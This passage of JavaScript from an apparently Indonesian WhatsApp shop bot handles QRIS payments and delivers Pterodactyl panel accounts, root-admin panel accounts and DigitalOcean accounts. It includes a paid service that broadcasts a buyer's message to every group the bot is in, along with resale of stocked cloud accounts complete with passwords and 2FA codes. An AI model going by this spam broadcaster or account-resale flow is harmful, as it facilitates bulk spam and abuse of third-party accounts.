 *ァ Barang :* Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await gisnaxd.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~\~~~~~~~~~~\

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buyadp"]) return Reply("❌ Produk *PANEL* saat ini tidak tersedia!");
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyptpanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buyptpanel"]) return Reply("❌ Produk *PANEL* saat ini tidak tersedia!");
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "30000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Pt Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyownerpanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buyownerpanel"]) return Reply("❌ Produk *PANEL* saat ini tidak tersedia!");
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "40000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Owner Panel Pterodactyl
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return m.reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!db.produk["buyjasajpm"]) return Reply("❌ Produk *Jasher* saat ini tidak tersedia!");
const tgc = await gisnaxd.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return m.reply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Jasa jpm
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Jasa Jpm
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);

let rest
if (Obj.img !== undefined) {
rest = await gisnaxd.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await gisnaxd.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await gisnaxd.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await gisnaxd.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return m.reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `.buydo ${urutt += 1}`
})
}
return gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `© BOTSHOP`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`${global.webapi}/api/orkut/createpayment?amount=${amount}&codeqr=${global.qrisOrderKuota}&apikey=${global.restapi}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *ァ ID :* ${get.data.result.transactionId}
 *ァ Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *ァ Barang :* Digital Ocean
 *ァ Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await gisnaxd.sendMessage(m.chat, {
  footer: ` ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`${global.webapi}/api/orkut/cekstatus?merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}&apikey=${global.restapi}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *ァ ID :* ${db.users[m.sender].saweria.idDeposit}
 *ァ Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *ァ Barang :* Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
let transaksiSukses = {
  id: db.users[m.sender].saweria.idDeposit,
  user: m.sender,
  amount: db.users[m.sender].saweria.amount,
  method: "QRIS"
};

await sendPaymentNotificationToOwner(transaksiSukses);
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await gisnaxd.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await gisnaxd.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
